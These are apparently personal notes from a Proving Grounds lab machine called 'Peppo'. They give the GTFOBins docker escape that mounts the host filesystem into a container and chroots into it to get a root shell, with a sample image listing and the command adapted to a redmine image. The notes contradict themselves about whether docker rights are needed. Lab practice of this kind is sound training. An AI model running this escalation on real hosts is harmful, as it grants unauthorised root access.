
https://flast101.github.io/docker-privesc/

https://gtfobins.org/gtfobins/docker/#shell


requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.


This function can be performed by any unprivileged user.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```




use the GTFObins command replacing the value `<alpine>` with one of the images found using command: 
## docker images

xxxxx@peppo:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              xxxxxxxxxxxxx        5 years ago         542MB
postgres            latest              xxxxxxxxxxxxx       5 years ago         313MB
xxxxx@peppo:~$ 

.

example: (practise with Peppo in Proving Grounds)

```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

